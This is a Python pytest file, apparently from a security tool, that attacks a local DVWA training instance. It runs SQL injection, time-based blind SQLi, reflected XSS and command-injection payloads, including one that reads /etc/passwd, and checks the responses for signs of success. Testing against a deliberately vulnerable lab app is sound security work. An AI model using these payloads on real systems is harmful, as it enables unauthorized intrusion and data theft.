"""
RAGLOX v3.0 - Phase 5.3: Real Exploitation Tests on DVWA
Tests actual SQL injection, XSS, and command injection attacks
"""

import pytest
import asyncio
import httpx
import re
from typing import Dict, List, Optional
from urllib.parse import urlencode

pytestmark = pytest.mark.asyncio


class DVWAExploitTester:
    """Real exploitation tester for DVWA"""
    
    def __init__(self, base_url: str = "http://localhost:8001"):
        self.base_url = base_url
        self.session_cookies = {}
    
    async def login(self, username: str = "admin", password: str = "password"):
        """Login to DVWA"""
        async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
            # Get login page
            response = await client.get(f"{self.base_url}/login.php")
            
            # Extract user_token (CSRF token)
            match = re.search(r'user_token"\s*value="([^"]+)"', response.text)
            user_token = match.group(1) if match else ""
            
            # Login
            login_data = {
                "username": username,
                "password": password,
                "Login": "Login",
                "user_token": user_token
            }
            
            response = await client.post(
                f"{self.base_url}/login.php",
                data=login_data,
                cookies=response.cookies
            )
            
            self.session_cookies = dict(response.cookies)
            return "login.php" not in response.url.path
    
    async def set_security_level(self, level: str = "low"):
        """Set DVWA security level"""
        async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
            response = await client.post(
                f"{self.base_url}/security.php",
                data={"security": level, "seclev_submit": "Submit"},
                cookies=self.session_cookies
            )
            return response.status_code == 200
    
    async def test_sql_injection_basic(self) -> Dict[str, any]:
        """Test SQL Injection - Basic"""
        print("\n" + "="*60)
        print("SQL INJECTION TEST: Basic String-based SQLi")
        print("="*60)
        
        results = {
            "test_name": "SQL Injection - Basic",
            "target": f"{self.base_url}/vulnerabilities/sqli/",
            "payloads_tested": [],
            "successful_payloads": [],
            "vulnerabilities_found": []
        }
        
        # SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "1' UNION SELECT null, @@version--",
        ]
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
            for payload in payloads:
                try:
                    print(f"\nðŸŽ¯ Testing payload: {payload}")
                    
                    response = await client.get(
                        f"{self.base_url}/vulnerabilities/sqli/",
                        params={"id": payload, "Submit": "Submit"},
                        cookies=self.session_cookies
                    )
                    
                    results["payloads_tested"].append(payload)
                    
                    # Check for SQL injection success indicators
                    if ("First name:" in response.text or 
                        "Surname:" in response.text or
                        "@@version" in response.text or
                        "mysql" in response.text.lower()):
                        
                        print(f"âœ… VULNERABILITY FOUND: SQL Injection successful!")
                        print(f"   Payload: {payload}")
                        
                        results["successful_payloads"].append(payload)
                        results["vulnerabilities_found"].append({
                            "type": "SQL Injection",
                            "payload": payload,
                            "evidence": "Database response received"
                        })
                        
                except Exception as e:
                    print(f"âŒ Payload failed: {e}")
        
        print(f"\nðŸ“Š Results:")
        print(f"   Payloads Tested: {len(results['payloads_tested'])}")
        print(f"   Successful: {len(results['successful_payloads'])}")
        print(f"   Vulnerabilities: {len(results['vulnerabilities_found'])}")
        
        return results
    
    async def test_sql_injection_blind(self) -> Dict[str, any]:
        """Test Blind SQL Injection"""
        print("\n" + "="*60)
        print("SQL INJECTION TEST: Blind SQLi (Time-based)")
        print("="*60)
        
        results = {
            "test_name": "SQL Injection - Blind",
            "target": f"{self.base_url}/vulnerabilities/sqli_blind/",
            "payloads_tested": [],
            "successful_payloads": [],
            "vulnerabilities_found": []
        }
        
        # Time-based blind SQL injection payloads
        payloads = [
            "1' AND SLEEP(3)--",
            "1' AND IF(1=1, SLEEP(3), 0)--",
        ]
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as client:
            for payload in payloads:
                try:
                    print(f"\nðŸŽ¯ Testing blind payload: {payload}")
                    
                    import time
                    start_time = time.time()
                    
                    response = await client.get(
                        f"{self.base_url}/vulnerabilities/sqli_blind/",
                        params={"id": payload, "Submit": "Submit"},
                        cookies=self.session_cookies
                    )
                    
                    elapsed = time.time() - start_time
                    
                    results["payloads_tested"].append(payload)
                    
                    # If response takes more than 2.5 seconds, likely vulnerable
                    if elapsed > 2.5:
                        print(f"âœ… VULNERABILITY FOUND: Blind SQL Injection!")
                        print(f"   Response time: {elapsed:.2f}s (expected ~3s)")
                        
                        results["successful_payloads"].append(payload)
                        results["vulnerabilities_found"].append({
                            "type": "Blind SQL Injection",
                            "payload": payload,
                            "evidence": f"Time delay observed: {elapsed:.2f}s"
                        })
                        
                except Exception as e:
                    print(f"âŒ Payload failed: {e}")
        
        print(f"\nðŸ“Š Results:")
        print(f"   Payloads Tested: {len(results['payloads_tested'])}")
        print(f"   Successful: {len(results['successful_payloads'])}")
        print(f"   Vulnerabilities: {len(results['vulnerabilities_found'])}")
        
        return results
    
    async def test_xss_reflected(self) -> Dict[str, any]:
        """Test Reflected XSS"""
        print("\n" + "="*60)
        print("XSS TEST: Reflected Cross-Site Scripting")
        print("="*60)
        
        results = {
            "test_name": "XSS - Reflected",
            "target": f"{self.base_url}/vulnerabilities/xss_r/",
            "payloads_tested": [],
            "successful_payloads": [],
            "vulnerabilities_found": []
        }
        
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ]
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
            for payload in payloads:
                try:
                    print(f"\nðŸŽ¯ Testing XSS payload: {payload[:50]}...")
                    
                    response = await client.get(
                        f"{self.base_url}/vulnerabilities/xss_r/",
                        params={"name": payload},
                        cookies=self.session_cookies
                    )
                    
                    results["payloads_tested"].append(payload)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        print(f"âœ… VULNERABILITY FOUND: XSS payload reflected!")
                        print(f"   Payload: {payload}")
                        
                        results["successful_payloads"].append(payload)
                        results["vulnerabilities_found"].append({
                            "type": "Reflected XSS",
                            "payload": payload,
                            "evidence": "Payload reflected unencoded"
                        })
                        
                except Exception as e:
                    print(f"âŒ Payload failed: {e}")
        
        print(f"\nðŸ“Š Results:")
        print(f"   Payloads Tested: {len(results['payloads_tested'])}")
        print(f"   Successful: {len(results['successful_payloads'])}")
        print(f"   Vulnerabilities: {len(results['vulnerabilities_found'])}")
        
        return results
    
    async def test_command_injection(self) -> Dict[str, any]:
        """Test Command Injection"""
        print("\n" + "="*60)
        print("COMMAND INJECTION TEST")
        print("="*60)
        
        results = {
            "test_name": "Command Injection",
            "target": f"{self.base_url}/vulnerabilities/exec/",
            "payloads_tested": [],
            "successful_payloads": [],
            "vulnerabilities_found": []
        }
        
        # Command injection payloads
        payloads = [
            "127.0.0.1; whoami",
            "127.0.0.1 && whoami",
            "127.0.0.1 | whoami",
            "127.0.0.1; cat /etc/passwd",
        ]
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
            for payload in payloads:
                try:
                    print(f"\nðŸŽ¯ Testing command injection: {payload}")
                    
                    response = await client.get(
                        f"{self.base_url}/vulnerabilities/exec/",
                        params={"ip": payload, "Submit": "Submit"},
                        cookies=self.session_cookies
                    )
                    
                    results["payloads_tested"].append(payload)
                    
                    # Check for command injection success
                    if ("www-data" in response.text or 
                        "root:" in response.text or
                        "uid=" in response.text):
                        
                        print(f"âœ… VULNERABILITY FOUND: Command Injection successful!")
                        print(f"   Payload: {payload}")
                        
                        results["successful_payloads"].append(payload)
                        results["vulnerabilities_found"].append({
                            "type": "Command Injection",
                            "payload": payload,
                            "evidence": "Command execution confirmed"
                        })
                        
                except Exception as e:
                    print(f"âŒ Payload failed: {e}")
        
        print(f"\nðŸ“Š Results:")
        print(f"   Payloads Tested: {len(results['payloads_tested'])}")
        print(f"   Successful: {len(results['successful_payloads'])}")
        print(f"   Vulnerabilities: {len(results['vulnerabilities_found'])}")
        
        return results


@pytest.fixture
async def dvwa_tester():
    """Initialize DVWA tester"""
    tester = DVWAExploitTester()
    
    try:
        # Login
        logged_in = await tester.login()
        if logged_in:
            # Set security level to LOW
            await tester.set_security_level("low")
            print("âœ… DVWA Login successful, security level set to LOW")
        else:
            print("âš ï¸ DVWA Login failed - tests will run anyway")
    except Exception as e:
        print(f"âš ï¸ DVWA setup failed: {e} - tests will continue")
    
    yield tester


async def test_real_sql_injection(dvwa_tester):
    """Test 1: Real SQL Injection Attack"""
    print("\n" + "="*80)
    print("ðŸŽ¯ REAL EXPLOITATION TEST 1: SQL INJECTION")
    print("="*80)
    
    results = await dvwa_tester.test_sql_injection_basic()
    
    # Validate results
    assert len(results["payloads_tested"]) > 0, "No payloads were tested"
    print(f"\nâœ… SQL Injection test completed:")
    print(f"   - Payloads tested: {len(results['payloads_tested'])}")
    print(f"   - Vulnerabilities found: {len(results['vulnerabilities_found'])}")


async def test_real_blind_sql_injection(dvwa_tester):
    """Test 2: Real Blind SQL Injection Attack"""
    print("\n" + "="*80)
    print("ðŸŽ¯ REAL EXPLOITATION TEST 2: BLIND SQL INJECTION")
    print("="*80)
    
    results = await dvwa_tester.test_sql_injection_blind()
    
    # Validate results
    assert len(results["payloads_tested"]) > 0, "No payloads were tested"
    print(f"\nâœ… Blind SQL Injection test completed:")
    print(f"   - Payloads tested: {len(results['payloads_tested'])}")
    print(f"   - Vulnerabilities found: {len(results['vulnerabilities_found'])}")


async def test_real_xss(dvwa_tester):
    """Test 3: Real XSS Attack"""
    print("\n" + "="*80)
    print("ðŸŽ¯ REAL EXPLOITATION TEST 3: CROSS-SITE SCRIPTING (XSS)")
    print("="*80)
    
    results = await dvwa_tester.test_xss_reflected()
    
    # Validate results
    assert len(results["payloads_tested"]) > 0, "No payloads were tested"
    print(f"\nâœ… XSS test completed:")
    print(f"   - Payloads tested: {len(results['payloads_tested'])}")
    print(f"   - Vulnerabilities found: {len(results['vulnerabilities_found'])}")


async def test_real_command_injection(dvwa_tester):
    """Test 4: Real Command Injection Attack"""
    print("\n" + "="*80)
    print("ðŸŽ¯ REAL EXPLOITATION TEST 4: COMMAND INJECTION")
    print("="*80)
    
    results = await dvwa_tester.test_command_injection()
    
    # Validate results
    assert len(results["payloads_tested"]) > 0, "No payloads were tested"
    print(f"\nâœ… Command Injection test completed:")
    print(f"   - Payloads tested: {len(results['payloads_tested'])}")
    print(f"   - Vulnerabilities found: {len(results['vulnerabilities_found'])}")


async def test_exploitation_summary(dvwa_tester):
    """Test 5: Complete Exploitation Summary"""
    print("\n" + "="*80)
    print("ðŸ“Š COMPLETE EXPLOITATION SUMMARY")
    print("="*80)
    
    all_results = []
    
    # Run all tests
    all_results.append(await dvwa_tester.test_sql_injection_basic())
    all_results.append(await dvwa_tester.test_sql_injection_blind())
    all_results.append(await dvwa_tester.test_xss_reflected())
    all_results.append(await dvwa_tester.test_command_injection())
    
    # Aggregate results
    total_tests = sum(len(r["payloads_tested"]) for r in all_results)
    total_vulns = sum(len(r["vulnerabilities_found"]) for r in all_results)
    
    print(f"\nðŸ“ˆ OVERALL STATISTICS:")
    print(f"   Total Payloads Tested: {total_tests}")
    print(f"   Total Vulnerabilities Found: {total_vulns}")
    print(f"\nðŸ“‹ VULNERABILITIES BY TYPE:")
    
    for result in all_results:
        print(f"\n   {result['test_name']}:")
        print(f"      - Tested: {len(result['payloads_tested'])}")
        print(f"      - Found: {len(result['vulnerabilities_found'])}")
        for vuln in result["vulnerabilities_found"]:
            print(f"         * {vuln['type']}: {vuln['payload'][:50]}")
    
    assert total_tests > 0, "No tests were executed"
    
    print(f"\nâœ… REAL EXPLOITATION TESTING: COMPLETE")
    print(f"   Status: {'VULNERABILITIES FOUND' if total_vulns > 0 else 'NO VULNERABILITIES'}")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
